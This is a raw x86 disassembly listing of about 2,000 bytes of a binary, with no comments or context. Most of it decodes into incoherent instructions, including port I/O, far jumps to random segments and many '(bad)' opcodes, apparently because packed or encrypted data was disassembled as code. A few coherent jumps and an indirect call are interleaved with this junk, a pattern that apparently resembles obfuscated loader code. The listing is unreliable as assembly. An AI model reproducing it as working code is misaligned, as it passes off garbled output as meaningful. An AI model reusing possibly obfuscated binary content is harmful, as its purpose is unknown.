  4091e9:	pop    ebp
  4091ea:	xchg   ah,bl
  4091ec:	cmp    esp,eax
  4091ee:	or     BYTE PTR [esi+0x7abbc65a],ah
  4091f4:	xlat   BYTE PTR ds:[ebx]
  4091f5:	aaa    
  4091f6:	mov    bl,0x81
  4091f8:	cmp    cl,ch
  4091fa:	add    BYTE PTR [edi-0x42d6bdf6],cl
  409200:	pop    ss
  409201:	xchg   bl,bl
  409203:	enter  0x5ed5,0x8f
  409207:	jb     0x409221
  409209:	(bad)  
  40920a:	scas   eax,DWORD PTR es:[edi]
  40920b:	inc    edi
  40920c:	dec    ecx
  40920d:	ss stos BYTE PTR es:[edi],al
  40920f:	cwde   
  409210:	push   0xffffffd6
  409212:	lock or ebp,DWORD PTR [ebx+edx*1+0x41719cfb]
  40921a:	adc    al,0xa
  40921c:	pop    edx
  40921d:	retf   0x2900
  409220:	test   al,0xdc
  409222:	fwait
  409223:	sub    al,0x16
  409225:	hlt    
  409226:	pusha  
  409227:	push   ds
  409228:	stc    
  409229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40922a:	les    edi,FWORD PTR [eax+0x129a8ec1]
  409230:	inc    ecx
  409231:	loope  0x409216
  409233:	sbb    eax,0x4f1f250f
  409238:	pop    ecx
  409239:	sub    al,0xa4
  40923b:	gs mov ecx,0x7261b052
  409241:	adc    eax,0xc61bc497
  409246:	and    DWORD PTR [esi],eax
  409248:	jmp    0x797c:0x9fd88510
  40924f:	xchg   BYTE PTR [edx-0x7f],dl
  409252:	dec    edx
  409253:	fwait
  409254:	nop
  409255:	cmp    al,0x28
  409257:	pop    edx
  409258:	push   edx
  409259:	outs   dx,BYTE PTR ds:[esi]
  40925a:	push   edx
  40925b:	dec    eax
  40925c:	mov    cl,dh
  40925e:	lds    edx,FWORD PTR [edx+0x62]
  409261:	lsl    ebx,WORD PTR [edx]
  409264:	aas    
  409265:	clc    
  409266:	aaa    
  409267:	lods   al,BYTE PTR ds:[esi]
  409268:	ret    0x3736
  40926b:	or     eax,ebp
  40926d:	mov    ss,WORD PTR [eax+0xa]
  409270:	pop    ds
  409271:	lods   eax,DWORD PTR ds:[esi]
  409272:	xchg   ebx,eax
  409273:	adc    dl,cl
  409275:	mov    esi,0xf4f87647
  40927a:	and    eax,0xc82ee666
  40927f:	aam    0x75
  409281:	sbb    al,0x8b
  409283:	popa   
  409284:	xchg   DWORD PTR [edi+ebp*1+0xc],ecx
  409288:	mov    ebp,ebx
  40928a:	push   es
  40928b:	pop    esp
  40928c:	jmp    0x9096:0xea78f9c9
  409293:	cmc    
  409294:	pop    edx
  409295:	(bad)  
  409296:	pop    edx
  409297:	cmp    al,BYTE PTR [ebx+0x6a66150]
  40929d:	cmp    eax,0x18f1b112
  4092a2:	mov    eax,0x78a9a438
  4092a7:	stos   BYTE PTR es:[edi],al
  4092a8:	inc    esp
  4092a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092aa:	and    esi,edx
  4092ac:	lds    edi,FWORD PTR [ebx+0x322ac3e4]
  4092b2:	pop    ebx
  4092b3:	je     0x409245
  4092b5:	jmp    0x5175:0xdd7abf10
  4092bc:	jo     0x4092b7
  4092be:	in     eax,0x23
  4092c0:	xor    eax,0x47a69dbb
  4092c5:	mov    ecx,0x9366c42
  4092ca:	xchg   esi,eax
  4092cb:	pop    ds
  4092cc:	pop    ebx
  4092cd:	fcom   QWORD PTR [eax-0x29]
  4092d0:	mov    ds:0xffb7f01b,eax
  4092d5:	clc    
  4092d6:	(bad)  
  4092d7:	xor    DWORD PTR [ebp-0x24391f8f],ecx
  4092dd:	mov    ch,0x26
  4092df:	loopne 0x409359
  4092e1:	inc    esp
  4092e2:	scas   al,BYTE PTR es:[edi]
  4092e3:	dec    ecx
  4092e4:	push   esi
  4092e5:	pop    ecx
  4092e6:	ins    BYTE PTR es:[edi],dx
  4092e7:	hlt    
  4092e8:	pop    es
  4092e9:	daa    
  4092ea:	mov    BYTE PTR [ebp+0x7a],dl
  4092ed:	in     eax,dx
  4092ee:	ja     0x40935d
  4092f0:	scas   al,BYTE PTR es:[edi]
  4092f1:	xlat   BYTE PTR ds:[ebx]
  4092f2:	(bad)  
  4092f3:	cmc    
  4092f4:	add    BYTE PTR [ebp-0x47351ab3],dl
  4092fa:	sbb    BYTE PTR [edi-0x5013fbb1],0xa6
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	push   edi
  40932e:	lods   al,BYTE PTR ds:[esi]
  40932f:	pop    esp
  409330:	inc    eax
  409331:	daa    
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x40932e
  40933a:	sub    DWORD PTR [esi-0x7251ec89],ecx
  409340:	jecxz  0x40938a
  409342:	xor    DWORD PTR ss:[eax],eax
  409345:	ror    BYTE PTR [edx],cl
  409347:	sbb    eax,0xb3ce7c63
  40934c:	sub    cl,BYTE PTR [esi-0x42]
  40934f:	aad    0x42
  409351:	mov    BYTE PTR [esi+0x7a],al
  409354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409355:	mov    edx,0xb2489b94
  40935a:	and    eax,0x6030f918
  40935f:	mov    ds:0xf461ba34,eax
  409364:	or     al,0x87
  409366:	push   ds
  409367:	mov    es,WORD PTR [edi+0x21469682]
  40936d:	fidiv  DWORD PTR ds:0x9036f9d
  409373:	mov    bl,ch
  409375:	mov    BYTE PTR [edx-0x3ff25a75],al
  40937b:	ins    BYTE PTR es:[edi],dx
  40937c:	cld    
  40937d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40937e:	mov    ebx,0x12a9e40b
  409383:	out    dx,eax
  409384:	xor    al,0x3b
  409386:	ins    DWORD PTR es:[edi],dx
  409387:	shl    BYTE PTR [ebx+ebp*1-0x409db1b4],0x57
  40938f:	ss ds shr ecx,0x38
  409394:	out    0x19,eax
  409396:	leave  
  409397:	imul   ebx,DWORD PTR [esi],0xffffffff
  40939a:	mov    ah,0x76
  40939c:	dec    eax
  40939d:	js     0x4093b1
  40939f:	loopne 0x4093bc
  4093a1:	or     al,0x2e
  4093a3:	mov    ah,0xb8
  4093a5:	js     0x40937e
  4093a7:	jb     0x40933d
  4093a9:	fidivr DWORD PTR [esi]
  4093ab:	sbb    BYTE PTR [esi-0x10],0x80
  4093af:	push   0x10
  4093b1:	popf   
  4093b2:	(bad)  [esi+0x517df85f]
  4093b8:	jno    0x40935d
  4093ba:	mov    bh,0x5a
  4093bc:	jbe    0x409351
  4093be:	push   ebp
  4093bf:	out    dx,eax
  4093c0:	arpl   bp,cx
  4093c2:	cwde   
  4093c3:	dec    ebp
  4093c4:	adc    ch,BYTE PTR [edx]
  4093c6:	mov    ebx,0xd7618efb
  4093cb:	jmp    DWORD PTR [eax-0x78c83986]
  4093d1:	or     eax,0xd111b682
  4093d6:	pop    es
  4093d7:	mov    al,ds:0x38a4288
  4093dc:	inc    edx
  4093dd:	dec    esp
  4093de:	push   cs
  4093df:	je     0x409391
  4093e1:	cmp    eax,0xef9160d7
  4093e6:	cld    
  4093e7:	push   ebp
  4093e8:	dec    eax
  4093e9:	stos   BYTE PTR es:[edi],al
  4093ea:	adc    edx,esi
  4093ec:	xchg   DWORD PTR [eax+0x7],esi
  4093ef:	jno    0x40945e
  4093f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093f2:	stc    
  4093f3:	jae    0x4093a9
  4093f5:	stos   BYTE PTR es:[edi],al
  4093f6:	leave  
  4093f7:	ret    0xfc61
  4093fa:	inc    ebx
  4093fb:	mov    ebx,0x850192a1
  409400:	adc    al,0xd8
  409402:	cld    
  409403:	out    dx,eax
  409404:	mov    al,BYTE PTR [ecx+0x605afff4]
  40940a:	repz mov ds:0x58020415,eax
  409410:	push   ebx
  409411:	push   esi
  409412:	aad    0x45
  409414:	cmp    al,0x2e
  409416:	in     al,dx
  409417:	push   ecx
  409418:	xchg   ebx,eax
  409419:	add    ecx,ebx
  40941b:	push   ds
  40941c:	paddusb mm6,mm3
  40941f:	data16 icebp 
  409421:	xchg   ecx,eax
  409422:	ja     0x4093bf
  409424:	outs   dx,DWORD PTR ds:[esi]
  409425:	data16 clc 
  409427:	test   bh,ch
  409429:	ror    DWORD PTR [ebx],cl
  40942b:	cmp    al,0x9c
  40942d:	dec    esp
  40942e:	cmc    
  40942f:	sbb    al,0x73
  409431:	push   es
  409432:	stos   BYTE PTR es:[edi],al
  409433:	icebp  
  409434:	sub    eax,0xa3b1d618
  409439:	or     edx,DWORD PTR [ecx]
  40943b:	ret    
  40943c:	ret    
  40943d:	sbb    edx,DWORD PTR [ebx]
  40943f:	pop    edx
  409440:	add    bl,ch
  409442:	cmp    DWORD PTR [edx+0x7d],ebx
  409445:	adc    eax,0xa1e11b0
  40944a:	jno    0x409495
  40944c:	inc    edx
  40944d:	neg    DWORD PTR [ecx-0x10aba917]
  409453:	int3   
  409454:	or     DWORD PTR [esp+edx*8],esp
  409457:	stos   BYTE PTR es:[edi],al
  409458:	outs   dx,BYTE PTR ds:[esi]
  409459:	mov    BYTE PTR [edi+ecx*4],al
  40945c:	retf   0x50cf
  40945f:	push   0x35
  409461:	std    
  409462:	sub    al,BYTE PTR [ecx]
  409464:	jmp    0x838a:0xfcb8b1f2
  40946b:	push   edx
  40946c:	neg    ch
  40946e:	cmp    dh,BYTE PTR [ecx+0x94d89ce]
  409474:	add    BYTE PTR [esi+0x6d24115f],al
  40947a:	test   DWORD PTR [esi],eax
  40947c:	cld    
  40947d:	cmp    eax,ebp
  40947f:	push   ecx
  409480:	outs   dx,BYTE PTR ds:[esi]
  409481:	cwde   
  409482:	stos   BYTE PTR es:[edi],al
  409483:	shl    DWORD PTR [ecx-0x73],0x31
  409487:	mov    WORD PTR [edi+0x65],ss
  40948a:	sahf   
  40948b:	aaa    
  40948c:	sbb    BYTE PTR [ebx-0x18],dh
  40948f:	pop    ecx
  409490:	cdq    
  409491:	sub    al,0x96
  409493:	pop    ebx
  409494:	fldenv [ebp+0x67b18ce4]
  40949a:	jns    0x40945a
  40949c:	mov    ebx,0xf6cf674a
  4094a1:	or     ebx,edx
  4094a3:	fild   QWORD PTR [edi]
  4094a5:	pop    edx
  4094a6:	mov    esi,?
  4094a8:	adc    BYTE PTR [esi+edx*4-0x42],dh
  4094ac:	es mov ah,0x94
  4094af:	in     eax,dx
  4094b0:	xor    bl,BYTE PTR [edx+0x9d8b7e4]
  4094b6:	dec    ebx
  4094b7:	aad    0xb9
  4094b9:	jo     0x409515
  4094bb:	repnz neg BYTE PTR [edx+0x51c1faec]
  4094c2:	mov    dh,0x1c
  4094c4:	pop    ebp
  4094c5:	aam    0x91
  4094c7:	push   edx
  4094c8:	xchg   ebx,eax
  4094c9:	push   esp
  4094ca:	xchg   esp,eax
  4094cb:	pop    ebp
  4094cc:	sahf   
  4094cd:	cmp    DWORD PTR [esi+eax*4+0x2154258b],esp
  4094d4:	es (bad) 
  4094d6:	sbb    DWORD PTR [esi],edi
  4094d8:	ins    DWORD PTR es:[edi],dx
  4094d9:	mov    WORD PTR [esi],?
  4094db:	mov    ah,bh
  4094dd:	jge    0x40954b
  4094df:	jmp    0xd7a0:0xe9df905d
  4094e6:	dec    esp
  4094e7:	sub    esi,eax
  4094e9:	data16 in al,0x13
  4094ec:	push   0xa1ca598a
  4094f1:	dec    esi
  4094f2:	xchg   ebp,eax
  4094f3:	stos   DWORD PTR es:[edi],eax
  4094f4:	cld    
  4094f5:	repnz fistp DWORD PTR [edi-0x4bcc65c8]
  4094fc:	add    eax,0x46bd78e1
  409501:	jbe    0x40957b
  409503:	pop    ecx
  409504:	test   al,0xf5
  409506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409507:	pop    edx
  409508:	push   ebx
  409509:	pop    ebx
  40950a:	test   eax,0x7798e47d
  40950f:	adc    DWORD PTR [edi-0x3],edi
  409512:	(bad)  
  409513:	(bad)  
  409514:	(bad)  
  409515:	inc    edx
  409516:	jo     0x4094de
  409518:	(bad)  
  40951a:	sub    ebx,DWORD PTR [ebx-0x1d]
  40951d:	jl     0x4094d8
  40951f:	addr16 cli 
  409521:	adc    eax,0x36ef2f7b
  409526:	cs dec esp
  409528:	mov    ch,0xe
  40952a:	xchg   ebx,eax
  40952b:	sbb    BYTE PTR [ecx+0x40],0x9d
  40952f:	je     0x409589
  409531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409532:	xchg   ebx,eax
  409533:	jecxz  0x40956c
  409535:	out    0xc,al
  409537:	fld    TBYTE PTR [edx+eax*4]
  40953a:	mov    WORD PTR [edx+eiz*1+0x38],cs
  40953e:	mov    di,0x72d1
  409542:	cdq    
  409543:	cmp    eax,0xce434f63
  409548:	cs das 
  40954a:	dec    esi
  40954b:	sbb    eax,0x164cf0ed
  409550:	sub    dh,cl
  409552:	mov    edi,0x8c0e4981
  409557:	and    eax,DWORD PTR [ebx]
  409559:	xor    eax,0x8de5cb1f
  40955e:	xchg   ecx,eax
  40955f:	test   DWORD PTR [esi],ecx
  409561:	loopne 0x409518
  409563:	in     eax,0x9d
  409565:	mov    esi,0x6fd9784f
  40956a:	cwde   
  40956b:	push   ss
  40956c:	add    BYTE PTR [eax+0xe],0x77
  409570:	into   
  409571:	popa   
  409572:	aaa    
  409573:	js     0x4095c1
  409575:	pop    esp
  409576:	rol    BYTE PTR [esp+ecx*8+0x61552a03],1
  40957d:	call   0xefb7e345
  409582:	adc    edi,DWORD PTR [ebx]
  409584:	ss in  eax,dx
  409586:	fdivr  QWORD PTR [ebp+0x10]
  409589:	push   edx
  40958a:	gs dec ecx
  40958c:	pop    ds
  40958d:	mov    dl,0x34
  40958f:	adc    bl,dl
  409591:	mov    edi,0xd2adf3f8
  409596:	adc    al,bh
  409598:	add    BYTE PTR [edx+edi*2],dl
  40959b:	out    dx,eax
  40959c:	(bad)  
  40959d:	call   0x7dd45e9
  4095a2:	pop    esi
  4095a3:	push   0x1356b1e2
  4095a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a9:	aad    0xb9
  4095ab:	xor    eax,DWORD PTR [ebx+0x7a]
  4095ae:	shl    DWORD PTR [ebp+0x5e2605c9],cl
  4095b4:	ins    BYTE PTR es:[edi],dx
  4095b5:	inc    edi
  4095b6:	push   sp
  4095b8:	sbb    bh,BYTE PTR [edx-0x5d]
  4095bb:	xchg   ebx,eax
  4095bc:	ins    BYTE PTR es:[edi],dx
  4095bd:	sbb    eax,DWORD PTR [eax-0x62]
  4095c0:	mov    esp,eax
  4095c2:	imul   edx,DWORD PTR [ecx],0xe4f0b44d
  4095c8:	jae    0x40955c
  4095ca:	sub    cl,BYTE PTR [ebx+0x44]
  4095cd:	dec    ebp
  4095ce:	loop   0x4095b3
  4095d0:	and    al,0xe8
  4095d2:	xchg   esp,eax
  4095d3:	and    BYTE PTR [ebx+0x1e],ch
  4095d6:	mov    al,ds:0x25988610
  4095db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095dc:	inc    ebx
  4095dd:	pop    edx
  4095de:	push   edi
  4095df:	jle    0x4095bd
  4095e1:	inc    ebp
  4095e2:	nop
  4095e3:	shl    ch,cl
  4095e5:	dec    edx
  4095e6:	cmp    BYTE PTR [ebx-0x323f4d4f],cl
  4095ec:	pop    ebp
  4095ed:	push   ebp
  4095ee:	jae    0x4095af
  4095f0:	(bad)  
  4095f1:	jns    0x40964d
  4095f3:	sti    
  4095f4:	mov    ecx,0xbc391b2b
  4095f9:	aam    0xba
  4095fb:	and    al,0x28
  4095fd:	pop    ds
  4095fe:	mov    bl,0xf1
  409600:	das    
  409601:	arpl   ax,ax
  409603:	push   esi
  409604:	sbb    bh,cl
  409606:	mov    bl,0xfc
  409608:	add    DWORD PTR [ebx-0x1a25a6ac],esi
  40960e:	imul   DWORD PTR [edx+0x19]
  409611:	mov    ds:0x76f4d25b,eax
  409616:	xor    esi,DWORD PTR ds:0xc490bafe
  40961c:	pop    es
  40961d:	sub    ecx,esi
  40961f:	sbb    BYTE PTR [edi-0x7e],cl
  409622:	in     eax,dx
  409623:	std    
  409624:	mov    al,dh
  409626:	lods   al,BYTE PTR ds:[esi]
  409627:	mov    dl,0x3c
  409629:	call   0x67fe:0x4fc5fbcb
  409630:	dec    esi
  409631:	xor    esi,esp
  409633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409634:	test   al,0x2f
  409636:	lods   eax,DWORD PTR ds:[esi]
  409637:	mov    edi,0xf89f3bbb
  40963c:	mov    ecx,ecx
  40963e:	mov    ah,0xe5
  409640:	(bad)  
  409642:	fld    TBYTE PTR [edx-0x6324cd1]
  409648:	push   edi
  409649:	sub    dl,BYTE PTR [ebx+0x4d0fa9af]
  40964f:	push   edx
  409650:	iret   
  409651:	adc    eax,0x56692419
  409656:	sar    DWORD PTR [esi+0x47],cl
  409659:	xlat   BYTE PTR ds:[ebx]
  40965a:	and    al,0xeb
  40965c:	aad    0xc
  40965e:	(bad)  
  40965f:	sub    DWORD PTR [ebx-0x673b5ee2],ecx
  409665:	push   esi
  409666:	jge    0x4096e4
  409668:	iret   
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [ebp-0x282c040c],esi
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40966e
  409693:	xor    BYTE PTR [ebx+0x62ceeaeb],al
  409699:	inc    edi
  40969a:	xchg   DWORD PTR [esi],ebp
  40969c:	xchg   esi,eax
  40969d:	stos   DWORD PTR es:[edi],eax
  40969e:	cmp    bh,BYTE PTR [ebx+0x6a985f00]
  4096a4:	pop    esp
  4096a5:	mov    ebp,0x7e2687dd
  4096aa:	dec    edx
  4096ab:	out    dx,eax
  4096ac:	out    dx,al
  4096ad:	mov    WORD PTR [eax-0x5e],cs
  4096b0:	clc    
  4096b1:	xor    BYTE PTR [edx+edi*2],ah
  4096b4:	jae    0x4096a2
  4096b6:	inc    edx
  4096b7:	sbb    bh,BYTE PTR [edi]
  4096b9:	cwde   
  4096ba:	inc    ebx
  4096bb:	shl    DWORD PTR [edi+eax*1+0x79],1
  4096bf:	push   ebp
  4096c0:	pop    ss
  4096c1:	push   ds
  4096c2:	dec    eax
  4096c3:	and    DWORD PTR [ebp+0x5b],esp
  4096c6:	and    al,0x62
  4096c8:	ficom  DWORD PTR [ebx-0x477f88e5]
  4096ce:	pop    ebp
  4096cf:	fst    QWORD PTR [esi]
  4096d1:	leave  
  4096d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096d3:	retf   
  4096d4:	dec    ecx
  4096d5:	icebp  
  4096d6:	mov    dh,0x18
  4096d8:	pop    ebx
  4096d9:	adc    ch,BYTE PTR [edx+0x30]
  4096dc:	jo     0x409721
  4096de:	pop    ebx
  4096df:	push   cs
  4096e0:	ins    DWORD PTR es:[edi],dx
  4096e1:	jmp    0xe761eb43
  4096e6:	test   al,0x11
  4096e8:	and    al,0xd9
  4096ea:	rcl    ecx,1
  4096ec:	(bad)  
  4096ed:	fdiv   st(7),st
  4096ef:	sbb    bl,0x24
  4096f2:	mov    bh,0xdf
  4096f4:	das    
  4096f5:	fldenv [esi]
  4096f7:	sbb    BYTE PTR [ebx-0x5f],dh
  4096fa:	fsub   DWORD PTR [edx*8+0x8573ee2]
  409701:	and    cl,ah
  409703:	mov    ah,ch
  409705:	pop    ss
  409706:	test   al,0x22
  409708:	jne    0x4096ba
  40970a:	sahf   
  40970b:	fstp   QWORD PTR [eax]
  40970d:	jl     0x4096d8
  40970f:	push   edi
  409710:	xchg   BYTE PTR [ebx+0x3d],bh
  409713:	ret    0x161a
  409716:	mov    al,dh
  409718:	adc    bl,dh
  40971a:	cwde   
  40971b:	sbb    edx,DWORD PTR ds:0x9f1b5bc6
  409721:	mov    ebx,0xa308fe6d
  409726:	mov    edi,0xd803e45a
  40972b:	popa   
  40972c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40972d:	adc    BYTE PTR ds:0xc8277559,0x1b
  409734:	sahf   
  409735:	fldcw  WORD PTR [ecx]
  409737:	mov    ?,WORD PTR [esi]
  409739:	jns    0x4096e5
  40973b:	cli    
  40973c:	je     0x4096bf
  40973e:	push   edx
  40973f:	cmp    esi,ebp
  409741:	call   0x4bcb8c4a
  409746:	fcomp  DWORD PTR [edx]
  409748:	sub    DWORD PTR [edx],0xffffffd3
  40974b:	xchg   esi,eax
  40974c:	and    eax,DWORD PTR [esi-0x6f]
  40974f:	mov    esi,0x820a2f1
  409754:	dec    ecx
  409755:	js     0x40972f
  409757:	dec    ebp
  409758:	ins    BYTE PTR es:[edi],dx
  409759:	jbe    0x40975b
  40975b:	out    dx,al
  40975c:	push   edx
  40975d:	daa    
  40975e:	retf   
  40975f:	pop    eax
  409760:	add    ch,bl
  409762:	fsub   DWORD PTR [eax+0xab39d2e]
  409768:	sbb    ebp,DWORD PTR [ecx-0x707a43e9]
  40976e:	mov    ah,0xee
  409770:	xor    ebx,edi
  409772:	and    al,0xc0
  409774:	xchg   DWORD PTR [ecx-0x2b3dd5a5],ebp
  40977a:	push   0xffffffc0
  40977c:	outs   dx,BYTE PTR ds:[esi]
  40977d:	mov    bl,0x9d
  40977f:	fsub   st,st(4)
  409781:	(bad)  
  409782:	out    0x61,eax
  409784:	and    BYTE PTR [ecx+0x16208100],ch
  40978a:	dec    ebp
  40978b:	add    ebx,ebx
  40978d:	out    0xdb,al
  40978f:	mov    eax,ds:0x5b6639c4
  409794:	add    eax,DWORD PTR [edi+ecx*4+0x55fe1729]
  40979b:	mov    al,ds:0x4e08ca3f
  4097a0:	cmp    eax,0xe9b33403
  4097a5:	push   edx
  4097a6:	in     al,dx
  4097a7:	dec    esp
  4097a8:	(bad)  [ecx-0x3a]
  4097ab:	push   cs
  4097ac:	mov    eax,ds:0x8e73bfcc
  4097b1:	gs dec edi
  4097b3:	and    eax,0x154f96bb
  4097b8:	sbb    esi,DWORD PTR [esi+0x23]
  4097bb:	xchg   esp,eax
  4097bc:	jmp    0x92cb6430
  4097c1:	mov    cl,0x85
  4097c3:	jno    0x409792
  4097c5:	popa   
  4097c6:	ret    0xb461
  4097c9:	adc    BYTE PTR [ecx+ebx*8-0x576ead9f],al
  4097d0:	rcl    DWORD PTR [ebp+ecx*1+0x7],cl
  4097d4:	out    dx,al
  4097d5:	mov    edx,0xf3953679
  4097da:	jnp    0x4097ac
  4097dc:	loop   0x40978c
  4097de:	fsub   QWORD PTR [edx+0x6d]
  4097e1:	pop    ecx
  4097e2:	aad    0x5d
  4097e4:	loop   0x4097e2
  4097e6:	mov    edx,0x597563a6
  4097eb:	loopne 0x409794
  4097ed:	repnz or eax,0xb1358abb
  4097f3:	mov    eax,ds:0x7c984c9b
  4097f8:	shl    BYTE PTR [ebx-0x427a2a5e],1
  4097fe:	outs   dx,BYTE PTR ds:[esi]
  4097ff:	aam    0xe1
  409801:	or     DWORD PTR [ecx+ebp*2],0x59
  409805:	(bad)  
  409806:	idiv   BYTE PTR [ecx+0x421dddfb]
  40980c:	ds jge 0x409791
  40980f:	dec    ebp
  409810:	mov    ch,0x39
  409812:	xchg   ebx,eax
  409813:	mul    BYTE PTR [esi+0x32043cc9]
  409819:	cld    
  40981a:	and    ebx,DWORD PTR ds:0x7afa1b08
  409820:	in     al,0x5f
  409822:	fwait
  409823:	aad    0x16
  409825:	scas   eax,DWORD PTR es:[edi]
  409826:	mov    ds:0x21a4275,al
  40982b:	arpl   WORD PTR [ebp-0x53c11075],bx
  409831:	fs push ds
  409833:	pop    esi
  409834:	jecxz  0x4097b6
  409836:	sar    DWORD PTR [esi],1
  409838:	in     eax,dx
  409839:	push   edx
  40983a:	cmp    eax,DWORD PTR [ecx-0x23128b2]
  409840:	inc    eax
  409841:	mov    DWORD PTR [edx],ebx
  409843:	jnp    0x4097d7
  409845:	add    al,0x84
  409847:	xlat   BYTE PTR ds:[ebx]
  409848:	ins    DWORD PTR es:[edi],dx
  409849:	xchg   ecx,eax
  40984a:	xor    esp,DWORD PTR [ebx-0x27]
  40984d:	mov    al,BYTE PTR [edi-0x5b]
  409850:	pop    edx
  409851:	not    ecx
  409853:	and    DWORD PTR [eax-0x301d9c66],0xffffffe5
  40985a:	add    ch,BYTE PTR [eax-0x14436b73]
  409860:	arpl   WORD PTR [ebx-0x5b7f37b3],si
  409866:	mov    ds:0x6c107cfa,al
  40986b:	shl    DWORD PTR [eax+0x4b],cl
  40986e:	add    cl,BYTE PTR [edx+0x21]
  409871:	fadd   QWORD PTR [edx+0x52236620]
  409877:	jmp    0x5981983f
  40987c:	xchg   esp,eax
  40987d:	shr    DWORD PTR [esi],1
  40987f:	or     DWORD PTR [ebp-0x58],0x36
  409883:	outs   dx,BYTE PTR ds:[esi]
  409884:	jne    0x40982b
  409886:	hlt    
  409887:	cld    
  409888:	jnp    0x40987d
  40988a:	leave  
  40988b:	dec    eax
  40988c:	mov    al,ds:0x7683ffcd
  409891:	cmp    al,0x43
  409893:	sbb    eax,0x80f85529
  409898:	push   ebx
  409899:	inc    esp
  40989a:	gs popa 
  40989c:	jmp    0x6fdc4a54
  4098a1:	nop
  4098a2:	mov    al,0x35
  4098a4:	jecxz  0x40984b
  4098a6:	sub    eax,0xca39d05a
  4098ab:	loope  0x409902
  4098ad:	hlt    
  4098ae:	mov    eax,ds:0xacf977cc
  4098b3:	xchg   esp,eax
  4098b4:	sbb    bh,BYTE PTR [edi]
  4098b6:	mov    eax,ds:0xeb6549db
  4098bb:	jnp    0x4098f5
  4098bd:	mov    ds:0xa179b57b,eax
  4098c2:	mov    DWORD PTR [ebx-0x7e],esi
  4098c5:	mov    al,0x9c
  4098c7:	cwde   
  4098c8:	pushf  
  4098c9:	inc    esp
  4098ca:	arpl   WORD PTR [ebx-0x1cec581f],ax
  4098d0:	push   es
  4098d1:	jns    0x4098de
  4098d3:	in     al,dx
  4098d4:	and    cl,BYTE PTR [ebx-0x46]
  4098d7:	and    BYTE PTR [eax-0x5f],dl
  4098da:	outs   dx,BYTE PTR ds:[si]
  4098dc:	cmc    
  4098dd:	jg     0x409864
  4098df:	ret    0x263f
  4098e2:	push   edi
  4098e3:	icebp  
  4098e4:	lock jne 0x4098f3
  4098e7:	rol    BYTE PTR [edx],0xbb
  4098ea:	cmp    BYTE PTR [ecx-0xac9039d],dh
  4098f0:	test   ecx,0x6f611b37
  4098f6:	lahf   
  4098f7:	push   ecx
  4098f8:	adc    al,0x67
  4098fa:	int    0x6b
  4098fc:	fistp  QWORD PTR [ebx+0x63]
  4098ff:	sbb    esp,DWORD PTR [ebx-0x30]
  409902:	test   ecx,esp
  409904:	test   eax,0xebbc4928
  409909:	add    al,0x66
  40990b:	(bad)  
  40990d:	and    eax,0x31d92071
  409912:	pusha  
  409913:	cdq    
  409914:	xchg   DWORD PTR [eax+0x30],ebx
  409917:	repnz cmp DWORD PTR [eax-0x39590c5b],esi
  40991e:	xor    BYTE PTR [edx],bl
  409920:	or     DWORD PTR [esi],edi
  409922:	iret   
  409923:	push   ebx
  409924:	mov    DWORD PTR [ecx],esi
  409926:	mov    eax,0x9b37c434
  40992b:	or     dh,bh
  40992d:	in     eax,dx
  40992e:	or     DWORD PTR [ebp+0xae72822],esi
  409934:	add    BYTE PTR [ecx],ah
  409936:	push   ds
  409937:	fdiv   QWORD PTR [ecx+eax*8-0x4add895c]
  40993e:	dec    eax
  40993f:	stc    
  409940:	sar    BYTE PTR [eax+esi*2-0x3b],1
  409944:	and    edi,DWORD PTR [ebx+0x631b00a2]
  40994a:	cmp    eax,edx
  40994c:	xchg   ecx,eax
  40994d:	repz pusha 
  40994f:	pop    edi
  409950:	in     al,0x8a
  409952:	dec    ebx
  409953:	dec    edx
  409954:	sub    eax,0x1adace3b
  409959:	addr16 lahf 
  40995b:	loop   0x40997c
  40995d:	icebp  
  40995e:	fwait
  40995f:	and    cl,ah
  409961:	pop    esi
  409962:	jbe    0x40990f
  409964:	arpl   WORD PTR [ebp-0x2f],si
  409967:	and    ah,BYTE PTR [esi]
  409969:	(bad)  
  40996a:	mov    ecx,esp
  40996c:	setp   BYTE PTR [edx+0xe]
  409970:	adc    esp,edx
  409972:	clc    
  409973:	cmp    eax,0x1598d254
  409978:	inc    ebp
  409979:	adc    ch,ah
  40997b:	rol    edi,1
  40997d:	xchg   esi,eax
  40997e:	lods   al,BYTE PTR ds:[esi]
  40997f:	test   eax,0x8ba8af4a
  409984:	push   eax
  409985:	or     eax,0x26b4371b
  40998a:	xchg   esp,eax
  40998b:	in     eax,dx
  40998c:	pop    ss
  40998d:	xlat   BYTE PTR ds:[ebx]
  40998e:	rcl    BYTE PTR [ebx+0x36],cl
  409991:	sahf   
  409992:	jmp    0xcc2d797b
  409997:	jns    0x409968
  409999:	into   
  40999a:	push   edi
  40999b:	jmp    0x4d37dd11
